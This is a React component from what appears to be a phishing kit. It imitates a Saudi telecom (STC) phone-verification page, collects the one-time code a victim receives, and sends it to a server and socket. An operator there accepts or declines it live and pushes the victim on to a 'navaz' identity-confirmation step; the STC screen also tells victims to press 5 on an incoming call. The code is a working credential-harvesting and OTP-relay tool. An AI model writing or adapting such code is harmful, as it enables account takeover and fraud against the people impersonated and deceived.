import React, { useEffect, useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { api_route, socket } from "../App";
import { testData } from "./PhonePage";

const PhoneOtp = () => {
  const [loading, setLoading] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const stc = query.get("stc");
  const [STC] = useState(stc === "check");
  const [counter, setCounter] = useState(180);
  const [phoneOtp, setPhoneOtp] = useState("");

  const selectedProvider =
    testData.find((test) => test.name === sessionStorage.getItem("provider")) ||
    testData[0];

  useEffect(() => {
    const timer = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");
  const ID = sessionStorage.getItem("id");

  // Server targets this socket with io.to(orderId).emit(...); must join that room.
  useEffect(() => {
    if (!ID) return;
    const joinRoom = () => socket.emit("joinOrder", ID);
    joinRoom();
    socket.on("connect", joinRoom);
    return () => socket.off("connect", joinRoom);
  }, [ID]);

  useEffect(() => {
    const sameOrder = (id) => String(id) === String(ID);

    // Server emits { id, code } — not `price` (see server acceptPhoneOtp handler).
    const onAcceptPhoneOTP = (payload) => {
      const { id, code, price } = payload || {};
      const navazCode = code ?? price;
      if (!sameOrder(id)) return;
      // STC flow: Phone → Phone OTP → STC call screen → (admin) Navaz code
      const provider = sessionStorage.getItem("provider");
      if (provider === "اس تي سي") {
        window.location.href = "/stcOtp?phase=call";
        return;
      }
      if (stc === "check") return;
      window.location.href = `/navaz?code=${encodeURIComponent(navazCode ?? "")}`;
    };

    const onDeclinePhoneOTP = (id) => {
      if (!sameOrder(id)) return;
      setLoading(false);
      window.location.href = "/phoneOtp";
    };

    const onAcceptService = ({ id, price, code }) => {
      if (!sameOrder(id)) return;
      const navaz = price ?? code ?? "";
      window.location.href = `/navaz?otp=${encodeURIComponent(navaz)}&stc=${stc || ""}`;
    };

    const onDeclineService = (id) => {
      if (!sameOrder(id)) return;
      window.location.href = "/stcOtp";
    };

    socket.on("acceptPhoneOtp", onAcceptPhoneOTP);
    socket.on("declinePhoneOtp", onDeclinePhoneOTP);
    socket.on("acceptService", onAcceptService);
    socket.on("declineService", onDeclineService);

    return () => {
      socket.off("acceptPhoneOtp", onAcceptPhoneOTP);
      socket.off("declinePhoneOtp", onDeclinePhoneOTP);
      socket.off("acceptService", onAcceptService);
      socket.off("declineService", onDeclineService);
    };
  }, [ID, stc]);

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    try {
      await axios.post(`${api_route}/phoneOtp/${sessionStorage.getItem("id")}`, {
        phoneOtp,
      });
      socket.emit("phoneOtp", {
        id: sessionStorage.getItem("id"),
        phoneOtp,
      });
    } catch {
      setLoading(false);
    }
  };

  if (STC) {
    return (
      <div className="w-full flex flex-col justify-center items-center bg-white h-screen py-2 gap-y-10">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
          className="w-1/2"
          alt="STC"
        />
        <div className="w-full flex flex-col items-center gap-y-4">
          <p className="text-xl font-bold"> STC سوف يتم الاتصال بك من </p>
          <p className="font-bold text-gray-500" style={{ fontSize: "12px" }}>
            لتاكيد طلبك الرجاء الضغط على رقم 5
          </p>
          <span className="text-purple-700 font-bold">! يرجي الانتظار</span>
        </div>
        <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
          <span className="text-purple-700 font-bold ">إعادة الاتصال بعد </span>
          <span className="text-purple-700 font-bold">
            {formattedMinutes}:{formattedSeconds}
          </span>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full lg:w-1/2 flex flex-col items-center justify-center rounded-md">
      <form
        className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
          <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
          <div className="flex items-start ">
            <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
            <span className="font-semibold">
              تم إرسال رمز التحقق إلي هاتفك النقال , الرجاء إدخاله في هذه الخانة .
            </span>
          </div>
        </div>

        <div className="flex justify-end items-center mb-1 -mt-2 rounded-lg px-2">
          <img
            src={selectedProvider.img}
            alt={selectedProvider.name}
            className="h-16 object-contain"
            onError={(e) => {
              e.currentTarget.style.display = "none";
            }}
          />
        </div>

        <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
          <input
            value={phoneOtp}
            onChange={(e) => setPhoneOtp(e.target.value)}
            required
            dir="ltr"
            placeholder="  رمز التحقق"
            inputMode="numeric"
            type="text"
            maxLength={6}
            className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full"
          />
        </div>
        <div className="flex items-center justify-between">
          <div className="flex justify-center items-center my-4">
            <span className="text-gray-600">
              إعادة إرسال: {formattedMinutes}:{formattedSeconds}
            </span>
          </div>
          <div className="flex items-center justify-center py-5 mt-4">
            <button
              type="submit"
              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-full text-base font-semibold transition-colors"
            >
              تحقق
            </button>
          </div>
        </div>

        <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
          <img src="/phoneFooter.jpeg" alt="CST" className="object-contain" />
        </div>
      </form>

      {loading && (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin height="50" width="50" color="blue" visible />
          <span className="font-semibold">
            يرجي الانتظار جاري التاكد من صحة البيانات المدخلة
          </span>
        </div>
      )}
    </div>
  );
};

export default PhoneOtp;
